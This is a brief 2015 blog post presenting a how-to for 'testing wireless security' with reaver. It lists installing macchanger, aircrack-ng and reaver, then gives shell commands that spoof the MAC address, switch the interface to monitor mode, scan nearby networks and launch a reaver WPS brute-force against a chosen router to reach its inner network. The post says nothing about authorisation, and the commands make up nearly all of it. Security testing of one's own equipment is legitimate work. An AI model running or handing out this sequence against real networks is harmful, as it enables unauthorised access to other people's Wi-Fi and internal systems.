---
layout: post
title: "Use reave for testing wireless security"
date: 2015-04-28 19:37
comments: true
categories: Linux
---
For those who want to test the wireless security(Wireless Router), following is a serial of tools for automatically scan the WIFI and try to find the entrance to inner network.    
### Preparation
Install following packages:    

```
$ sudo apt-get install macchanger  aircrack-ng reaver

```
### Testing 
Suppose the wireless port in our equipment is mlan0, following are the detailed steps:     

```
# macchanger -m 00:11:22:33:44:55 mlan0
# airmon-ng start mlan0
# ifconfig mlan0mon down
# macchanger -m 00:11:22:33:44:55 mlan0mon
# ifconfig mlan0mon up
# airodump-ng mlan0mon
# reaver -i mlan0mon -b xx:xx:xx:xx:xx -vv -dh-small

```

